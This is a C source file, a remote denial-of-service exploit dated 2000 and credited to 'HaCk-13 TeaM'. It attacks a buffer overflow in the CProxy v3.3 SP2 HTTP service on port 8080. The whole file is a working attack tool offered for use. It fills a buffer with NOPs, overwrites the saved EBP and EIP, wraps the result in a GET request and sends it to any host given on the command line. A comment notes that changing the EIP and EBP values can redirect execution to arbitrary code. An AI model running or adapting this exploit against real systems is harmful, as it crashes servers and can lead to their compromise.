/*
 * Remote Denial of Service for CProxy v3.3 - Service Pack 2
 * 
 * (C) |[TDP]|  - HaCk-13 TeaM -  2000      <tdp@psynet.net>
 *
 *
 * This program xploits an overflow vulnerability in CProxy 3.3 SP2
 * HTTP Service (8080), causing server shutdown
 *
 * Greetings to all the other members and all my friends :) 
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFFERSIZE 247
#define NOP 0x90
// If you change this values you can change EIP and EBP values
// to redirect to a code that you want >;)
#define EIP 0x61616161
#define EBP 0x61616161

void usage(char *progname) {
 fprintf(stderr,"Usage: %s <hostname> [eip] [ebp]\n",progname);
 exit(1);
}

int main(int argc, char **argv) {
char *ptr,buffer[BUFFERSIZE], remotedos[1024];
unsigned long *long_ptr,eip=EIP, ebp=EBP;
int aux,sock;
struct sockaddr_in sin;
unsigned long ip;
struct hostent *he;

 fprintf(stderr,"\n-= Remote DoS for CProxy v3.3 ServicePack 2 - (C) |[TDP]| - H13 Team =-\n");

 if (argc<2) usage(argv[0]);

 if (argc>=3) eip+=atol(argv[2]);

 if (argc>=4) ebp+=atol(argv[3]);

 ptr=buffer;
 memset(ptr,0,sizeof(buffer));
 memset(ptr,NOP,sizeof(buffer)-8);
 ptr+=sizeof(buffer)-8;
 long_ptr=(unsigned long*)ptr;
 *(long_ptr++) = ebp;
 *(long_ptr++) = eip;
 ptr=(char *)long_ptr;
 *ptr='\0';

 bzero(remotedos, sizeof(remotedos));
 snprintf(remotedos, sizeof(remotedos), "GET http://%s HTTP/1.0\r\n\r\n\r\n",buffer);

 if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
 perror("socket()");
 return -1;
 }

 if ((he = gethostbyname(argv[1])) != NULL) {
 ip = *(unsigned long *)he->h_addr;
 } else {
 if ((ip = inet_addr(argv[1])) == NULL) {
  perror("inet_addr()");
  return -1;
 }
 }

 sin.sin_family = AF_INET;
 sin.sin_addr.s_addr = ip;
 sin.sin_port = htons(8080);

 fprintf(stderr,"\nEngaged...\n");
 if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
 perror("connect()");
 return -1;
 }

 if (write(sock, remotedos, strlen(remotedos)) < strlen(remotedos)) {
 perror("write()");
 return -1;
 }

 fprintf(stderr,"Bye Bye baby!...\n\n");
 if (close(sock) < 0) {
 perror("close()");
 return -1;
 }

 return(0);
}

